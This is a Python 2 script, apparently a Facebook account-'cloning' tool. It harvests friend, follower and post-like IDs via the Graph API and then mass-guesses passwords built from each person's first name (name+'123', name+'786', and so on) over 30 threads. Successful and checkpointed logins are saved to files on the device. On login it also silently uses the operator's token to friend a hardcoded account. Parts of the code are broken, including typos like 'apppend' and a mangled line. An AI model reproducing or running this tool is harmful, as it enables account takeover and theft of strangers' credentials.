#!/usr/bin/python

# coding=utf-8

# Originally Written By:Jam Shahrukh

# Source : Python2"

# Donot Recode It. 

#Import module

try:

    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookielib,getpass,mechanize,requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system("pip2 install requests")

    os.system("pkg install nodejs")

    os.system("python2 f-r.py")

try:

    os.mkdir('/sdcard/ids')

except OSError:

    pass 

try:

    os.mkdir("/sdcard/ids/ex_ids")

except OSError:

    pass

os.system("git pull")

from requests.exceptions import ConnectionError

bd=random.randint(2e7, 3e7)

sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding("utf8")

 

logo = """

___====-_  _-====___

           _--^^^#####//      \\#####^^^--_

        _-^##########// (    ) \\##########^-_

       -############//  |\^^/|  \\############-

     _/############//   (@::@)   \\############\_

    /#############((     \\//     ))#############\

   -###############\\    (oo)    //###############-

  -#################\\  / VV \  //#################-

 -###################\\/      \//###################-

_#/|##########/\######(   /\   )######/\##########|\#_

|/ |#/\#/\#/\/  \#/\##\  |  |  /##/\#/  \/\#/\#/\#| \|

`  |/  V  V  `   V  \#\| |  | |/#/  V   '  V  V  \|  '

   `   `  `      `   / | |  | | \   '      '  '   '

                    (  | |  | |  )

                   __\ | |  | | /__

                  (vvv(VVV)(VVV)vvv)

\033[3m\033[1;97m══════════════════════════════════════════════

 [✓] Owner   : FANTAxFEROZ

 [✓] Youtub  : Unknown Hackers

 [✓] Facebook: SHANxZEESHAN

 [✓] Whatsapp: 03123347192

 [✓] Whatsapp: 03043227572

 [✓] Haters Call Me Papa :)

══════════════════════════════════════════════"""

idh = []

back = 0

def tlogin():

	os.system('clear')	print(logo)

	username = raw_input("[+] TOOL USERNAME: ")

	if username =="FANTA-BRAND":

	    os.system('clear')

	    print(logo)

	    print "[✓] TOOL USERNAME: "+username+ " (correct)"

	else:

	    print "[!] Invalid Username."

	    os.system('xdg-open https://www.youtube.com/channel/UCdwF9LXC2aOnM0FXmsiGBpQ')

	    time.sleep(1)

	    tlogin()

	    

	passw = raw_input("[+] TOOL PASSWORD: ")

	if passw =="FEROZ-BRAND":

	    os.system('clear')

	    print(logo)

	    print "[✓] TOOL USERNAME: " +username+ " (correct)"

	    print "[✓] TOOL PASSWORD: " +passw+ "  (correct)"

	    os.system('xdg-open https://www.youtube.com/channel/UCdwF9LXC2aOnM0FXmsiGBpQ')

	    time.sleep(1)

	    login_choice()

	else:

	    print "[!] Invalid Password."

	    time.sleep(1)

	    tlogin()

	try:

		toket = open('.login.txt','r')

		os.system('python2 f-r.py')

	except (KeyError,IOError):

		login_choice()

	else:

		print "[!] Invalid Password"

		time.sleep(1)

		tlogin()

def login_choice():

	os.system("clear")

	try:

		token = open(".login.txt","r").read()

		menu()

	except IOError:

		os.system("clear")

		print(logo)

		print("\t    \033[1;32mLOGIN MENU\033[0;97m")

		print("══════════════════════════════════════════════")

		print("[1] Login with token")

		print("[2] Login with id/pass")

		print("══════════════════════════════════════════════")

		login_select()

def login_select():

	select = raw_input("\033[1;33mChoose option: \033[0;97m")

	if select =="1":

		login_token()

	elif select =="2":

		login_fb()

	else:

		print("══════════════════════════════════════════════")

		print("\t    \033[1;31mSelect valid option\033[0;97m")

		print("")

		time.sleep(1)

		login_select()

def login_fb():

	os.system("clear")

	print(logo)

	print("\t    \033[1;32mLOGIN WITH ID/PASS\033[0;97m")

	print("══════════════════════════════════════════════")

	id = raw_input(" Id/mail/number: ")

	id1=id.replace(' ','')

	id2=id1.replace('(','')

	uid=id2.replace(')','')

	pwd = raw_input(" Password: ")

	print("")

	data=requests.get('http://localhost:5000/auth?id='+uid+'&pass='+pwd, headers=header).text

	q = json.loads(data)

	if "loc" in q:

		jam = open(".login.txt","w")

		jam.write(q["loc"])

		jam.close()

		requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token='+q['loc'])

		menu()

	elif "www.facebook.com" in q["error"]:

		print("\t    \033[1;31mUser must verify account before login\033[0;97m")

		time.sleep(1)

		print("══════════════════════════════════════════════")

		raw_input("\tPress enter to back ")

		login_choice()

	else:

		print("")

		print("\t    \033[1;31mIncorrect credentials\033[0;97m")

		raw_input("Press enter to try again ")

		login_choice()

def login_token():

	os.system("clear")

	try:

		token = open(".login.txt","r").read()

		time.sleep(1)

		menu()

	except (KeyError , IOError):

	    os.system("clear")

	    print(logo)

	    print("")

	    print("\t    \033[1;32mFB TOKEN LOGIN\033[0;97m")

	    print("")

	    token = raw_input(" Paste token here: ")

	    token_save = open(".login.txt","w")

	    token_save.write(token)

	    token_save.close()

	    time.sleep(1)

	    menu()

def menu():

	os.system("clear")

	try:

		token = open(".login.txt","r").read()

	except IOError:

		os.system("clear")

		print(logo)

		print("\t    \033[1;31mToken not found\033[0;97m")

		time.sleep(1)

		login_choice()

	try:

		r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)

		a = json.loads(r.text)

		name = a["name"]

	except KeyError:

		os.system("clear")

		print(logo)

		print("\t    \033[1;31mToken expired\033[0;97m")

		time.sleep(1)

		os.system("rm -rf .login.txt")

		login_choice()

	os.system("clear")

	print(logo)

	print("\t    \033[7m\033[1;32mUser: "+name+"\033[0;97m")

	print("══════════════════════════════════════════════")

	print("[1] Crack with auto name pass")

	print("[2] Crack with choice number pass")

	print("[3] Create File")

	print("[4] Extract Group Post Likes")

	print("══════════════════════════════════════════════")

	menu_option()

def menu_option():

	select = raw_input("\033[1;33mChoose option: \033[0;97m")

	if select =="1":

		crack()

	elif select =="2":

		choice()

	elif select =="3":

		ex_id()

	elif select =="4":

	        ex_post()

	else:

		print("")

		print("\t    \033[1;31mSelect valid option\033[0;97m")

		print("")

		menu_option()

def crack():

	global token

	os.system("clear")

	try:

		token = open(".login.txt","r").read()

	except IOError:

		print("")

		print("\t    \033[1;31mToken not found\033[0;97m")

		time.sleep(1)

		login_choice()

	os.system("clear")

	print(logo)

	print("\t    \033[7m\033[1;32mAUTO PASS CLONING\033[0;97m")

	print("══════════════════════════════════════════════")

	print("[1] Crack public id")

	print("[2] Crack followers")

	print("[3] Crack file")

	print("[0] Back")

	print("")

	crack_select()

def crack_select():

	select = raw_input("\033[1;33mChoose option: \033[0;97m")

	id=[]

	oks=[]

	cps=[]

	if select =="1":

		os.system("clear")

		print(logo)

		print("\t    \033[7m\033[1;32mAUTO PASS PUBLIC CRACK\033[0;97m")

		print("══════════════════════════════════════════════")

		idt = raw_input(" Input id: ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			print(" Cloning from : "+q["name"])

		except KeyError:

			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

			print("")

			raw_input(" Press enter to back")

			crack()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="2":

		os.system("clear")

		print(logo)

		print("\t    \033[7m\033[1;32mAUTO PASS CRACK FOLLOWERS\033[0;97m")

		print("══════════════════════════════════════════════")

		idt = raw_input(" Input id: ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			print(" Cloning from: "+q["name"])

		except KeyError:

			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

			print("")

			raw_input(" Press enter to back")

			crack()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="3":

		os.system("clear")

		print(logo)

		print("\t    \033[7m\033[1;32mAUTO PASS FILE CRACK\033[0;97m")

		print("══════════════════════════════════════════════")

		try:

			filelist = raw_input("[+] File : ")

			for line in open(filelist , "r").readlines():

			    id.append(line.strip())

		except (KeyError,IOError):

			print("")

			print("\t    \033[1;31mRequested file not found\033[0;97m")

			print("")

			raw_input(" Press enter to back ")

			crack()

	elif select =="0":

	    menu()

	else:

		print("")

		print("\t    \033[1;31mSelect valid option\033[0;97m")

		print("")

		crack_select()

	print("Total IDs : "+str(len(id)))

	print("The Process has started")

	print("\033[3══════════════════════════════════════════════")

	def main(arg):

		user=arg

		uid,name=user.split("|")

		try:

			pass1 = name+"12"

			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text

			q = json.loads(data)

			if "loc" in q:

				print("\033[1;92m[Alex-Ok] "+uid+" | "+pass1)

				ok = open("/sdcard/ids/SHAN-Ok.txt", "a")

				ok.write(uid+" | "+pass1+"\n")

				ok.close()

				oks.append(uid+pass1)

			else:

				if "www.facebook.com" in q["error"]:

					print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass1)

					cp = open("/sdcard/ids/jam_cp.txt","a")

					cp.write(uid+" | "+pass1+"\n")

					cp.close()

					cps.append(uid+pass1)

				else:

					pass2 = name+"123"

					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text

					q = json.loads(data)

					if "loc" in q:

						print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass2)

						ok = open("/sdcard/ids/SHAN-Ok.txt", "a")

						ok.write(uid+" | "+pass2+"\n")

						ok.close()

						oks.append(uid+pass2)

					else:

						if "www.facebook.com" in q["error"]:

							print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass2)

							cp = open("/sdcard/ids/ZEESHAN_cp.txt","a")

							cp.write(uid+" | "+pass2+"\n")

							cp.close()

							cps.append(uid+pass2)

						else:

							pass3 = name+"1234"

							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text

							q = json.loads(data)

							if "loc" in q:

								print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass3)

								ok = open("/sdcard/ids/Jam-Ok.txt", "a")

								ok.write(uid+" | "+pass3+"\n")

								ok.close()

								oks.append(uid+pass3)

							else:

								if "www.facebook.com" in q["error"]:

									print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass3)

									cp = open("/sdcard/ids/jam_cp.txt","a")

									cp.write(uid+" | "+pass3+"\n")

									cp.close()

									cps.append(uid+pass3)

								else:

									pass4 = name+"12345"

									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text

									q = json.loads(data)

									if "loc" in q:

										print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass4)

										ok = open("/sdcard/ids/Alex-Ok.txt", "a")

										ok.write(uid+" | "+pass4+"\n")

										ok.close()

										oks.append(uid+pass4)

									else:

										if "www.facebook.com" in q["error"]:

											print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass4)

											cp = open("/sdcard/ids/ZEESHAN_cp.txt","a")

											cp.write(uid+" | "+pass4+"\n")

											cp.close()

											cps.apppend(uid+pass4)

										else:

											pass5 = name+"786"

											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text

											q = json.loads(data)

											if "loc" in q:

												print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass5)

												ok = open("/sdcard/ids/SHAN-Ok.txt", "a")

												ok.write(uid+" | "+pass5+"\n")

												ok.close()

												oks.append(uid+pass5)

											else:

												if "www.facebook.com" in q["error"]:

													print("\033[1;90m[Ali-Cp] "+uid+" | "+pass5)

													cp = open("/sdcard/ids/ZEESHAN_cp.txt","a")

													cp.write(uid+" | "+pass5+"\n")

													cp.close()

													cps.append(uid+pass5)

												else:

													pass6 = name+"1122"

													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text

													q = json.loads(data)

													if "loc" in q:

														print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass6)

														ok = open("/sdcard/ids/jam_ok.txt", "a")

														ok.write(uid+" | "+pass6+"\n")

														ok.close()

														oks.append(uid+pass6)

													else:

														if "www.facebook.com" in q["error"]:

															print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass6)

															cp = open("/sdcard/ids/ZESSHAN_cp.txt","a")

															cp.write(uid+" | "+pass6+"\n")

															cp.close()

															cps.append(uid+pass6)

																

		except:

			pass

	

	p = ThreadPool(30)

	p.map(main,id)

	print("══════════════════════════════════════════════")

	print(" The process has completed")

	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))

	print("══════════════════════════════════════════════")

	raw_input(" Press enter to back")

	crack()

def ex_id():

    idg=[]

    global token

    try:

    	token = open(".login.txt","r").read()

    except IOError:

    	print("\t    \033[1;31mToken not found\033[0;97m")

    	print("")

    	time.sleep(1)

    	login_choice()

    os.system("clear")

    print(logo)

    print("\t    \033[7m\033[1;32mCOLLECT PUBLIC ID FRIENDLIST\033[0;97m")

    print("══════════════════════════════════════════════")

    idh = raw_input(" Input Id: ")

    try:

        r = requests.get("https://graph.facebook.com/"+idh+"?access_token="+token, headers=header)

        q = json.loads(r.text)

        print(" \033[7m\033[1;32mCollecting from: "+q["name"])

    except KeyError:

    	print("")

        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

        print("")

        raw_input(" Press enter to back")

        crack()

    r = requests.get("https://graph.facebook.com/"+idh+"/friends?access_token="+token, headers=header)

    q = json.loads(r.text)

    ids = open("ids_file.txt","w")

    for i in q["data"]:

        uid = i["id"]

        na = i["name"]

        nm=na.rsplit(" ")[0]

        idg.append(uid+"|"+nm)

        ids.write(uid+"|"+nm + "\n")

    ids.close()

    print("══════════════════════════════════════════════")

    print(" The process has completed")

    print(" Total ids: "+str(len(idg)))

    print("══════════════════════════════════════════════")

    raw_input(" Press enter to download file")

    os.system("cp ids_file.txt /sdcard")

    os.system("rm -rf ids_file.txt")

    print(" File downloaded successfully")

    time.sleep(1)

    menu()

def ex_post():

    idg=[]

    global token

    try:

    	token = open(".login.txt","r").read()

    except IOError:

    	print("\t    \033[1;31mToken not found\033[0;97m")

    	print("")

    	time.sleep(1)

    	login_choice()

    os.system("clear")

    print(logo)

    una = ('100052292505058')

    print("\t    \033[7m\033[1;32mCOLLECT POST LIKES LINKS\033[0;97m")

    print("══════════════════════════════════════════════")

    una = raw_input(" Input Post Id: ")

    try:

        r = requests.get("https://graph.facebook.com/me/friends?method=post&uids="+una+"&access_token="+token, headers=header)

        q = json.loads(r.text)

	print("══════════════════════════════════════════════")

    except KeyError:

    	print("")

        print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

        print("")

        raw_input(" Press enter to back")

        crack()

    r = requests.get("https://graph.facebook.com/"+una+"/reactions?limit=9999999&access_token="+token, headers=header)

    q = json.loads(r.text)

    ids = open("likes_post.txt","w")

    for i in q["friends"]["data"]:

        uid = i["id"]

        na = i["name"]

        nm=na.rsplit(" ")[0]

        idg.append(uid+"|"+nm)

        ids.write(uid+"|"+nm + "\n")

    ids.close()

    print("══════════════════════════════════════════════")

    print(" The process has completed")

    print(" Total ids: "+str(len(idg)))

    print("══════════════════════════════════════════════")

    raw_input(" Press enter to download file")

    os.system("cp likes_post.txt /sdcard")

    os.system("rm -rf likes_post.txt")

    print(" File downloaded successfully")

    time.sleep(1)

    menu()

def choice():

	global token

	os.system("clear")

	try:

		token = open(".login.txt","r").read()

	except IOError:

		print("")

		print("\t    \033[1;31mToken not found\033[0;97m")

		time.sleep(1)

		login_choice()

	os.system("clear")

	print(logo)

	print("\t    \033[7m\033[1;32mCHOICE PASS CRACK MENU\033[0;97m")

	print("══════════════════════════════════════════════")

	print("[1] Crack public id")

	print("[2] Crack followers")

	print("[3] Crack file")

	print("[0] Back")

	print("══════════════════════════════════════════════")

	choice_select()

def choice_select():

	select = raw_input("\033[1;33mChoose option: \033[0;97m")

	id=[]

	oks=[]

	cps=[]

	if select =="1":

		os.system("clear")

		print(logo)

		print("\t    \033[7m\033[1;32mCHOICE PASS PUBLIC CRACK\033[0;97m")

		print("══════════════════════════════════════════════")

		pass1 = raw_input(" Password: ")

		pass2 = raw_input(" Password: ")

		pass3 = raw_input(" Password: ")

		pass4 = raw_input(" Password: ")

		idt = raw_input(" Input id: ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			print(" Cloning from : "+q["name"])

		except KeyError:

			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

			print("")

			raw_input(" Press enter to back")

			choice()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="2":

		os.system("clear")

		print(logo)

		print("\t    \033[7m\033[1;32mCHOICE PASS CRACK FOLLOWERS\033[0;97m")

		print("══════════════════════════════════════════════")

		pass1 = raw_input(" Password: ")

		pass2 = raw_input(" Password: ")

		pass3 = raw_input(" Password: ")

		pass4 = raw_input(" Password: ")

		idt = raw_input(" Input id: ")

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			print(" Cloning from: "+q["name"])

		except KeyError:

			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")

			print("══════════════════════════════════════════════")

			raw_input(" Press enter to back")

			choice()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			uid = i["id"]

			na = i["name"]

			nm = na.rsplit(" ")[0]

			id.append(uid+"|"+nm)

	elif select =="3":

		os.system("clear")

		print(logo)

		print("\t    \033[7m\033[1;32mCHOICE PASS FILE CRACK\033[0;97m")

		print("══════════════════════════════════════════════")

		pass1 = raw_input(" Password: ")

		pass2 = raw_input(" Password: ")

		pass3 = raw_input(" Password: ")

		pass4 = raw_input(" Password: ")

		filelist = raw_input(" Input file: ")

		try:

			for line in open(filelist , "r").readlines():

			    id.append(line.strip())

		except (KeyError,IOError):

			print("")

			print("\t    \033[1;31mRequested file not found\033[0;97m")

			print("══════════════════════════════════════════════")

			raw_input(" Press enter to back ")

			choice()

	elif select =="0":

	    menu()

	else:

		print("")

		print("\t    \033[1;31mSelect valid option\033[0;97m")

		print("")

		choice_select()

	print("Total IDs : "+str(len(id)))

	print("The Process has started")

	print("\033[3══════════════════════════════════════════════")

	def main(arg):

		user=arg

		uid,name=user.split("|")

		try:

			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text

			q = json.loads(data)

			if "loc" in q:

				print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass1)

				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")

				ok.write(uid+" | "+pass1+"\n")

				ok.close()

				oks.append(uid+pass1)

			else:

				if "www.facebook.com" in q["error"]:

					print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass1)

					cp = open("/sdcard/ids/ZEESHAN_cp.txt","a")

					cp.write(uid+" | "+pass1+"\n")

					cp.close()

					cps.append(uid+pass1)

				else:

					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text

					q = json.loads(data)

					if "loc" in q:

						print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass2)

						ok = open("/sdcard/ids/jam_ok.txt", "a")

						ok.write(uid+" | "+pass2+"\n")

						ok.close()

						oks.append(uid+pass2)

					else:

						if "www.facebook.com" in q["error"]:

							print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass2)

							cp = open("/sdcard/ids/ZEESHAN_cp.txt","a")

							cp.write(uid+" | "+pass2+"\n")

							cp.close()

							cps.append(uid+pass2)

						else:

							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text

							q = json.loads(data)

							if "loc" in q:

								print("\033[1;92m[SHAN-Ok] "+uid+" | "+pass3)

								ok = open("/sdcard/ids/SHAN_ok.txt", "a")

								ok.write(uid+" | "+pass3+"\n")

								ok.close()

								oks.append(uid+pass3)

							else:

								if "www.facebook.com" in q["error"]:

									print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass3)

									cp = open("/sdcard/ids/ZEESHAN_cp.txt","a")

									cp.write(uid+" | "+pass3+"\n")

									cp.close()

									cps.append(uid+pass3)

								else:

									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text

									q = json.loads(data)

									if "loc" in q:

										print("\033[1;92m[F-R-Ok] "+uid+" | "+pass4)

										ok = open("/sdcard/ids/jam_ok.txt", "a")

										ok.write(uid+" | "+pass4+"\n")

										ok.close()

										oks.append(uid+pass4)

									else:

										if "www.facebook.com" in q["error"]:

											print("\033[1;90m[ZEESHAN-Cp] "+uid+" | "+pass4)

											cp = open("/sdcard/ids/ZEESHAN_cp.txt","a")

											cp.write(uid+" | "+pass4+"\n")

											cp.close()

											cps.apppend(uid+pass4)

																

		except:

			pass

	

	p = ThreadPool(30)

	p.map(main,id)

	print("══════════════════════════════════════════════")

	print(" The process has completed")

	print(" Total Ok/Cp:"+str(len(oks)))+"/"+str(len(cps))

	print("══════════════════════════════════════════════")

	raw_input(" Press enter to back")

	choice()

if __name__ == '__main__':

	tlogin()
